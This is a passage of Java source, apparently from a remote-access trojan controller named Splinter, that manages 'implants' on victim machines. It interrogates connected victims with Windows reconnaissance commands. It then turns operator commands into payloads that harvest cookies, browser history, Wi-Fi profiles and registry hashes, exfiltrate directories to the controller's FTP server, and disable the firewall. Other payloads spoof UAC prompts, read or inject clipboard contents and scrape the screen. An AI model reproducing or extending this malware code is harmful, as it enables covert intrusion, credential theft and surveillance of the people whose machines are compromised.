      Drivers.sop("Interrogation to this system failed Thread ID: [" + this.myThread_ID + "].  First Line returned: \"" + strFirstLine + "\" I can not determine the type of agent connected.  However, you might still be able to correspond with the agent!");

      pwSocket.println("");
    }

    this.dataAcquisitionComplete = true;
    this.I_have_an_important_message = "";

    return false;
  }

  public boolean interrogateNewAgent_NETCAT_NEWER(BufferedReader brSocket)
  {
    try
    {
      String strThirdLine = brSocket.readLine();

      if ((strThirdLine != null) && (strThirdLine.trim().equals("")))
      {
        Drivers.sop("-->>> Almost there... Confidence level for netcat: 75% ...");

        sendCommand_RAW("");

        String strFourthLine = brSocket.readLine();

        if ((strFourthLine != null) && (strFourthLine.trim().endsWith(">")))
        {
          Drivers.sop("-->>>> OK. So as best as I can tell, this is a netcat agent. I will label this implant netcat -->>>> Confidence level for netcat: 100% -->>>> I am sending commands to better interrogate the system now...");

          this.myIMPLANT_ID = 1;
          try { this.myImplantName = Driver.ARR_IMPLANT_NAME[this.myIMPLANT_ID]; } catch (Exception e) { this.myImplantName = "UNKNOWN"; }

          this.i_am_NETCAT_Agent = true;

          this.myImplantInitialLaunchDirectory = strFourthLine;

          brSocket.readLine();
        }

      }

      sendCommand_RAW("hostname");
      brSocket.readLine();
      this.myHostName = brSocket.readLine();

      sendCommand_RAW("echo %username%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myUserName = brSocket.readLine();

      sendCommand_RAW("echo %homedrive%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myHomeDrive = brSocket.readLine();

      sendCommand_RAW("echo %NUMBER_OF_PROCESSORS%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myNumberOfProcessors = brSocket.readLine();

      sendCommand_RAW("echo %OS%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myOS_Type = brSocket.readLine();

      sendCommand_RAW("echo %PROCESSOR_ARCHITECTURE%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myProcessorArchitecture = brSocket.readLine();

      sendCommand_RAW("echo %SystemRoot%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.mySystemRoot = brSocket.readLine();

      sendCommand_RAW("echo %USERDOMAIN%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myUserDomain = brSocket.readLine();

      sendCommand_RAW("echo %USERPROFILE%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myUserProfile = brSocket.readLine();

      sendCommand_RAW("echo %TEMP%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myTempPath = brSocket.readLine();

      sendCommand_RAW("wmic os get caption /value");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myOS = brSocket.readLine();
      try { this.myOS = this.myOS.replace("Caption=", ""); } catch (Exception localException1) {
      }
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();

      sendCommand_RAW("wmic os get CSDVersion /value");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myServicePack = brSocket.readLine();
      try { this.myServicePack = this.myServicePack.replace("CSDVersion=", ""); }
      catch (Exception localException2)
      {
      }
      sendCommand_RAW("wmic os get CountryCode /value");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myCountryCode = brSocket.readLine();
      try { this.myCountryCode = this.myCountryCode.replace("CountryCode=", ""); }
      catch (Exception localException3)
      {
      }
      sendCommand_RAW("wmic os get NumberOfUsers /value");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myNumberOfUsers = brSocket.readLine();
      try { this.myNumberOfUsers = this.myNumberOfUsers.replace("NumberOfUsers=", ""); }
      catch (Exception localException4)
      {
      }

      sendCommand_RAW("wmic os get Version /value");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myVersionNumber = brSocket.readLine();
      try { this.myVersionNumber = this.myVersionNumber.replace("Version=", ""); }
      catch (Exception localException5)
      {
      }

      sendCommand_RAW("wmic os get SerialNumber /value");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.mySerialNumber = brSocket.readLine();
      try { this.mySerialNumber = this.mySerialNumber.replace("SerialNumber=", "");
      } catch (Exception localException6) {
      }
      sendCommand_RAW("wmic os get OSArchitecture /value");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myOS_Architecture = brSocket.readLine();
      try { this.myOS_Architecture = this.myOS_Architecture.replace("OSArchitecture=", ""); } catch (Exception localException7) {
      }
      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("interrogateNewAgent_NETCAT", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  private boolean deprecated_acquireOverheadData_WINDOWS(BufferedReader brSocket, PrintWriter pwSocket)
  {
    this.dataAcquisitionComplete = false;
    try
    {
      sendCommand_RAW("hostname");
      this.myHostName = brSocket.readLine();

      sendCommand_RAW("echo %username%");
      this.myUserName = brSocket.readLine();

      sendCommand_RAW("echo %homedrive%");
      this.myHomeDrive = brSocket.readLine();

      sendCommand_RAW("echo %NUMBER_OF_PROCESSORS%");
      this.myNumberOfProcessors = brSocket.readLine();

      sendCommand_RAW("echo %OS%");
      this.myOS_Type = brSocket.readLine();

      sendCommand_RAW("echo %PROCESSOR_ARCHITECTURE%");
      this.myProcessorArchitecture = brSocket.readLine();

      sendCommand_RAW("echo %SystemRoot%");
      this.mySystemRoot = brSocket.readLine();

      sendCommand_RAW("echo %USERDOMAIN%");
      this.myUserDomain = brSocket.readLine();

      sendCommand_RAW("echo %USERPROFILE%");
      this.myUserProfile = brSocket.readLine();

      sendCommand_RAW("echo %TEMP%");
      this.myTempPath = brSocket.readLine();

      sendCommand_RAW("wmic os get caption /value");
      this.myOS = brSocket.readLine();
      try { this.myOS.replace("Caption=", ""); }
      catch (Exception localException1)
      {
      }
      sendCommand_RAW("wmic os get CSDVersion /value");
      this.myServicePack = brSocket.readLine();
      try { this.myServicePack.replace("CSDVersion=", ""); }
      catch (Exception localException2)
      {
      }
      sendCommand_RAW("wmic os get CountryCode /value");
      this.myCountryCode = brSocket.readLine();
      try { this.myCountryCode.replace("CountryCode=", ""); }
      catch (Exception localException3)
      {
      }
      sendCommand_RAW("wmic os get NumberOfUsers /value");
      this.myNumberOfUsers = brSocket.readLine();
      try { this.myNumberOfUsers.replace("NumberOfUsers=", ""); }
      catch (Exception localException4)
      {
      }
      sendCommand_RAW("wmic os get Version /value");
      this.myVersionNumber = brSocket.readLine();
      try { this.myVersionNumber.replace("Version=", ""); }
      catch (Exception localException5)
      {
      }
      sendCommand_RAW("wmic os get SerialNumber /value");
      this.mySerialNumber = brSocket.readLine();
      try { this.myVersionNumber.replace("SerialNumber=", ""); }
      catch (Exception localException6)
      {
      }
      sendCommand_RAW("wmic os get OSArchitecture /value");
      this.myOS_Architecture = brSocket.readLine();
      try { this.myOS_Architecture.replace("OSArchitecture=", ""); } catch (Exception localException7) {
      }
      if (!this.i_am_setup_as_relay)
      {
        Drivers.updateConnectedImplants();
        Drivers.jtblConnectedImplants.updateJTable = true;
      }

      this.dataAcquisitionComplete = true;
      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("acquireOverheadData_WINDOWS", this.strMyClassName, e, e.getLocalizedMessage(), false);

      if (!this.i_am_setup_as_relay)
      {
        Drivers.updateConnectedImplants();
      }

      this.dataAcquisitionComplete = true;
    }return false;
  }

  public String getThreadID() {
    return "_" + getId();
  }

  public String getChatScreenName() {
    if ((this.myChatScreenName == null) || (this.myChatScreenName.trim().equals("")))
    {
      this.myChatScreenName = ""+getId();
    }

    return this.myChatScreenName;
  }

  public String getChatJListData()
  {
    try
    {
      return "@" + getChatScreenName() + "_[" + getId() + "]_" + this.myVictim_RHOST_IP;
    }
    catch (Exception localException)
    {
    }

    return "ID: " + getId();
  }

  public String getJListData()
  {
    try
    {
      if ((this.myOS != null) && (!this.myOS.trim().equals("")))
      {
        return this.myOS_Shortcut + "_[" + getId() + "]_ " + this.myVictim_RHOST_IP;
      }

      if ((this.myOS_Type != null) && (!this.myOS_Type.trim().equals("")))
      {
        return this.myOS_Type + "_[" + getId() + "]_ " + this.myVictim_RHOST_IP;
      }

      return getId() + "@" + this.myVictim_RHOST_IP;
    }
    catch (Exception localException)
    {
    }

    return "ID: " + getId();
  }

  public Vector<String> getJTableRowData() {
    try {
      this.vctMyRowData.clear();
    } catch (Exception localException) {
    }
    if ((this.myOS == null) || (this.myOS.trim().equals(""))) {
      this.myOS = this.myOS_Type;
    }
    if ((this.myFullGeoData == null) || (this.myFullGeoData.trim().equals("")))
    {
      this.myFullGeoData = "UNKNOWN :-(";
    }

    if ((this.myImplantInitialLaunchDirectory == null) || (this.myImplantInitialLaunchDirectory.trim().equals("")))
    {
      this.myImplantInitialLaunchDirectory = ("." + Driver.fileSeperator);
    }
    else if (!this.myImplantInitialLaunchDirectory.endsWith(Driver.fileSeperator))
    {
      try
      {
        if (this.myImplantInitialLaunchDirectory.substring(this.myImplantInitialLaunchDirectory.length() - 5).contains("."))
        {
          this.myBinaryFileName = this.myImplantInitialLaunchDirectory.substring(this.myImplantInitialLaunchDirectory.lastIndexOf(Driver.fileSeperator) + 1);

          this.myImplantInitialLaunchDirectory = this.myImplantInitialLaunchDirectory.substring(0, this.myImplantInitialLaunchDirectory.lastIndexOf(Driver.fileSeperator));
        }
      }
      catch (Exception localException1) {
      }
      this.myImplantInitialLaunchDirectory += Driver.fileSeperator;

      if ((this.myImplantInitialLaunchDirectory != null) && (this.myImplantInitialLaunchDirectory.endsWith(Driver.fileSeperator)))
      {
        this.myCurrentWorkingDirectory = (this.myImplantInitialLaunchDirectory.substring(0, this.myImplantInitialLaunchDirectory.lastIndexOf(Driver.fileSeperator)).trim() + ">" + " ");
      }
      else
      {
        this.myCurrentWorkingDirectory = (this.myImplantInitialLaunchDirectory.trim() + ">" + " ");
      }

    }

    if (this.i_am_Beacon_Agent)
    {
      this.vctMyRowData.add(this.myLastConnectionTime);
      this.vctMyRowData.add(this.myConfirmationID_Beacon);
      this.vctMyRowData.add(this.myBeaconInterval);
      this.vctMyRowData.add(this.myApproxTimeTilNextBeacon);
    }
    else if (this.I_am_Disconnected_From_Implant)
    {
      this.vctMyRowData.add(this.myDisconnectionTime);
    }
    else
    {
      this.vctMyRowData.add(this.I_have_an_important_message);
    }

    if (((this.myOS_Shortcut == null) || (this.myOS_Shortcut.trim().equals(""))) && (this.myOS != null))
    {
      if (this.myOS.trim().toUpperCase().startsWith("MICROSOFT WINDOWS 7 PRO"))
      {
        this.myOS_Shortcut = "Win 7 Pro";
      }
      else
      {
        this.myOS_Shortcut = this.myOS;
      }
    }

    this.vctMyRowData.add(""+getId());
    this.vctMyRowData.add(this.myFullGeoData);
    this.vctMyRowData.add(this.myImplantName);
    this.vctMyRowData.add(this.myCareOfAddress);
    this.vctMyRowData.add(this.myImplantInitialLaunchDirectory);
    this.vctMyRowData.add(this.myBinaryFileName);
    this.vctMyRowData.add(this.myVictim_RHOST_IP);
    this.vctMyRowData.add(this.myHostName);
    this.vctMyRowData.add(this.myOS);
    this.vctMyRowData.add(this.myOS_Type);
    this.vctMyRowData.add(this.myUserName);
    this.vctMyRowData.add(this.myUserDomain);
    this.vctMyRowData.add(this.myTempPath);
    this.vctMyRowData.add(this.myUserProfile);
    this.vctMyRowData.add(this.myProcessorArchitecture);
    this.vctMyRowData.add(this.myNumberOfProcessors);
    this.vctMyRowData.add(this.mySystemRoot);
    this.vctMyRowData.add(this.myServicePack);
    this.vctMyRowData.add(this.myNumberOfUsers);
    this.vctMyRowData.add(this.mySerialNumber);
    this.vctMyRowData.add(this.myOS_Architecture);
    this.vctMyRowData.add(this.myCountryCode);
    this.vctMyRowData.add(this.myHomeDrive);
    this.vctMyRowData.add(this.myVersionNumber);

    return this.vctMyRowData;
  }

  public String getRHOST_IP()
  {
    return this.myVictim_RHOST_IP;
  }

  public boolean sendCommand_RAW(String cmdToSend)
	{
		
		
		try
		{
			
			
			try//if below fails, simply fall through to send it out anyhow!
			{
				try
				{
					Splinter_GUI.jpnlMainController.saveCommandHistory(cmdToSend);
				}catch(Exception f){}
				
				if(cmdToSend != null && cmdToSend.trim().startsWith(Driver.SHORTCUT_KEY_HEADER))
				{
					String [] arrInternalCmds = cmdToSend.split(Driver.INTERNAL_DELIMETER);
					
					int shortcutKey = Integer.parseInt(arrInternalCmds[1]);
																				
					switch(shortcutKey)
					{
						case Driver.SHORTCUT_VALUE_ESTABLISH_PERSISTENT_LISTENER:
						{
							int PORT = Integer.parseInt(arrInternalCmds[2]);
							
							if(PORT < 1 || PORT > 65534)
							{
								throw new Exception("Port out of range!");
							}
							
							String listenerBinary_ImageName =  arrInternalCmds[3];
							
							if(listenerBinary_ImageName == null || listenerBinary_ImageName.trim().equals(""))
							{
								throw new Exception("Binary File not specified");
							}
							
							cmdToSend = this.reformatShortcut_ESTABLISH_PERSISTEN_LISTENER(cmdToSend, PORT, listenerBinary_ImageName);
							
							break;
						}
						
						case Driver.SHORTCUT_BROWSE_REMOTE_FILE_SYSTEM:
						{
							
							break;
						}
						
						default:
						{
							throw new Exception("Unknown Shortcut Key Specified");
						}
						
					}
					
				}
				
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith("download"))
				{
					String []arr = cmdToSend.split("\"");
					if(arr.length != 2)
					{
						Driver.sop("download file is in invalid form.  enter download \"[absolute file path on remote machine]\"");
					}
					
					else if(!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
					{
						Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
					}
					
					else
					{
						cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SEND_FILE_TO_CONTROLLER + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT + Driver.delimeter_1 + arr[1];
						
					}
					
				}
				
				
				
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith("capture screen"))
				{										
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.CAPTURE_SCREEN + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;//to delete when done
					
				}
				
				
				else if(cmdToSend != null && (cmdToSend.trim().toLowerCase().startsWith("stop process") || cmdToSend.trim().equalsIgnoreCase(Driver.STOP_PROCESS)))
				{										
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.STOP_PROCESS;
					
				}
				
				
								
				
				
				else if(cmdToSend != null && cmdToSend.equalsIgnoreCase(Driver.ENUMERATE_SYSTEM))
				{										
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.ENUMERATE_SYSTEM + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;
					
				}
				
				
				else if(cmdToSend != null && cmdToSend.equalsIgnoreCase(Driver.HARVEST_WIRELESS_PROFILE))
				{										
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.HARVEST_WIRELESS_PROFILE + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;
					
				}
				
				
				else if(cmdToSend != null && cmdToSend.equalsIgnoreCase(Driver.HARVEST_COOKIES))
				{										
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.HARVEST_COOKIES + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;
					
				}
				
				
				else if(cmdToSend != null && cmdToSend.equalsIgnoreCase(Driver.HARVEST_BROWSER_HISTORY))
				{										
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.HARVEST_BROWSER_HISTORY + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;
					
				}
				
				
				else if(cmdToSend != null && cmdToSend.equalsIgnoreCase(Driver.HARVEST_REGISTRY_HASHES))
				{										
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.HARVEST_REGISTRY_HASHES + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;
					
				}
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.RUNNING_PROCESS_LIST))
				{										
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.RUNNING_PROCESS_LIST;
					
				}
				
				
				
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().equalsIgnoreCase("ps"))
				{										
					cmdToSend = "tasklist";
					
				}
				
				
				
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().equalsIgnoreCase("pwd"))
				{										
					cmdToSend = "echo %cd%";
					
				}
				
				
				
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().equalsIgnoreCase("ls"))
				{										
					cmdToSend = "dir";
					
				}
				
				
				
				
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith(Driver.SPOOF_UAC.toLowerCase()))
				{										
					String []arr = cmdToSend.split(",");
					if(arr.length != 3)
					{
						Driver.sop("spoof UAC is in invalid form. use [Spoofed Program Title], [Executable Name] next time.  e.g. " + Driver.SPOOF_UAC + ", Notepad, Notepad.exe" + ". I am sending Default Windows Update instead");
						
						
																																				
						cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SPOOF_UAC + Driver.delimeter_1 + "null" + Driver.delimeter_1 + "null";
					}
					else
					{
																																				
						cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.SPOOF_UAC + Driver.delimeter_1 + arr[1] + Driver.delimeter_1 + arr[2];
					}
					
					
				}
				
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.FILE_BROWSER_INITIATE))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.FILE_BROWSER_INITIATE;
				}
				
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.DISABLE_WINDOWS_FIREWALL))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.DISABLE_WINDOWS_FIREWALL;
				}
				
			else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.ENABLE_WINDOWS_FIREWALL))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.ENABLE_WINDOWS_FIREWALL;
				}
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.DISPLAY_WINDOWS_FIREWALL))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.DISPLAY_WINDOWS_FIREWALL;
				}
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.EXTRACT_CLIPBOARD))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.EXTRACT_CLIPBOARD;
				}
				
			
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.INJECT_CLIPBOARD))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.INJECT_CLIPBOARD + Driver.delimeter_1 + " " + Drivers.jop_Query("Enter String to Inject into Clipboard: ", "Inject Into Clipboard");
				}
				
				
				
				
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith(Driver.ORBIT_DIRECTORY.toLowerCase()))
				{										
					String [] arrOrbitEntries = cmdToSend.split(",");
					
					if(arrOrbitEntries == null || arrOrbitEntries.length != 5)
					{
						Drivers.jop("Invalid parameters for Orbiter Payload. Unable to Continue!");
						return true;
					}
					
					if(!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
					{
						Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
						return true;
					}
					
					int delay_secs = 1000;
					try
					{
						delay_secs = 1000 * Integer.parseInt(arrOrbitEntries[4].trim());
					}catch(Exception ff)
					{						
						Drivers.jop("Invalid parameters for Orbiter Payload Delay interval. Unable to Continue!");
						return true;
					}
															
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.ORBIT_DIRECTORY + Driver.delimeter_1 + arrOrbitEntries[1] + Driver.delimeter_1 + arrOrbitEntries[2] + Driver.delimeter_1 + arrOrbitEntries[3] + Driver.delimeter_1 + delay_secs + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;;					
				}
				
				else if(cmdToSend != null && (cmdToSend.trim().toLowerCase().startsWith(Driver.DATA_EXFIL_ALERTER_PAYLOAD.toLowerCase()) || cmdToSend.trim().toLowerCase().startsWith(Driver.DATA_EXFIL_EXTRACTOR_PAYLOAD.toLowerCase()) || cmdToSend.trim().toLowerCase().startsWith(Driver.DATA_EXFIL_INJECTOR_PAYLOAD.toLowerCase()) || cmdToSend.trim().toLowerCase().startsWith(Driver.DATA_EXFIL_INSPECTOR_PAYLOAD.toLowerCase()) || cmdToSend.trim().toLowerCase().startsWith(Driver.DATA_EXFIL_SELECTOR_PAYLOAD.toLowerCase())) )
				{										
					String [] arrOrbitEntries = cmdToSend.split(",");
					
					if(arrOrbitEntries == null || arrOrbitEntries.length != 5)
					{
						Drivers.jop("Invalid parameters for Orbiter Payload. Unable to Continue!");
						return true;
					}
					
					if(!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
					{
						Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
						return true;
					}
					
					int delay_secs = 1000;
					try
					{
						delay_secs = 1000 * Integer.parseInt(arrOrbitEntries[4].trim());
					}catch(Exception ff)
					{						
						Drivers.jop("Invalid parameters for Orbiter Payload Delay interval. Unable to Continue!");
						return true;
					}
															
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.ORBIT_DIRECTORY + Driver.delimeter_1 + arrOrbitEntries[1] + Driver.delimeter_1 + arrOrbitEntries[2] + Driver.delimeter_1 + arrOrbitEntries[3] + Driver.delimeter_1 + delay_secs + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;;					
				}
				
				
				
				else if(cmdToSend != null && (cmdToSend.trim().toLowerCase().startsWith("halt orbiter payload") || cmdToSend.trim().toLowerCase().startsWith("stop orbit directory") || cmdToSend.trim().equalsIgnoreCase(Driver.STOP_ORBIT_DIRECTORY)))
				{										
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.STOP_ORBIT_DIRECTORY;					
				}
				
				
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith(Driver.SET_WALLPAPER.toLowerCase()))
				{										
					String path = cmdToSend.replace(Driver.SET_WALLPAPER, "");
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SET_WALLPAPER + Driver.delimeter_1 + " " + path.trim();					
				}
				
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith("set wallpaper"))
				{										
					String path = cmdToSend.replace("set wallpaper", "");
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SET_WALLPAPER + Driver.delimeter_1 + " " + path.trim();					
				}
				
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith("change wallpaper"))
				{										
					String path = cmdToSend.replace("change wallpaper", "");
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SET_WALLPAPER + Driver.delimeter_1 + " " + path.trim();					
				}
				
				
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith(Driver.EXFIL_DIRECTORY.toLowerCase()))
				{										
					String [] arrOrbitEntries = cmdToSend.split(",");
					
					if(arrOrbitEntries == null || arrOrbitEntries.length != 4)
					{
						Drivers.jop("Invalid parameters for Data Extraction Payload. Unable to Continue!");
						return true;
					}
					
					if(!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
					{
						Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
						return true;
					}
							
															
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.EXFIL_DIRECTORY + Driver.delimeter_1 + arrOrbitEntries[1] + Driver.delimeter_1 + arrOrbitEntries[2] + Driver.delimeter_1 + arrOrbitEntries[3] + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;;					
				}
				
				
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.ENABLE_CLIPBOARD_EXTRACTOR))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.ENABLE_CLIPBOARD_EXTRACTOR;
				}
				
				
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.ENABLE_CLIPBOARD_INJECTOR))
				{
					//QUERY USER FOR INJECTION TEXT
					String injectionText = Drivers.jop_Query("Please Supply Injection Text: ", "Enter Injection Text");
					
					if(injectionText == null)
						return true;
					
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.ENABLE_CLIPBOARD_INJECTOR + Driver.delimeter_1 + injectionText + " ";
				}
				
				
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.DISABLE_CLIPBOARD_INJECTOR))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.DISABLE_CLIPBOARD_INJECTOR;
				}
				
				
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.DISABLE_CLIPBOARD_EXTRACTOR))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.DISABLE_CLIPBOARD_EXTRACTOR;
				}
				
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.SCRAPE_SCREEN))
				{		
					if(!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
					{
						Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
						return true;
					}
					
					configureEnvironmentForScreenScrape(Driver.SCREEN_CAPTURE_DIRECTORY_NAME);
					
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SCRAPE_SCREEN + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;//to delete when done
					
					if(worker_ScreenScrape != null)
					{
						try	
						{	
							worker_ScreenScrape.killThisThread = true;  
							
							if(worker_ScreenScrape.screenRecord != null)
							{
								worker_ScreenScrape.screenRecord.dispose();
							}
						}catch(Exception e){Driver.sop("Exception handled attempting to dispose previous screen renderer worker thread");}
					}
					
					worker_ScreenScrape = new Worker_Thread_Payloads(200, null,Worker_Thread_Payloads.PAYLOAD_RENDER_SCREEN, null, "", 1, this.fleMyScreenScrapeDirectory);
					worker_ScreenScrape.myTerminal = this;
					
				}
				
				
				
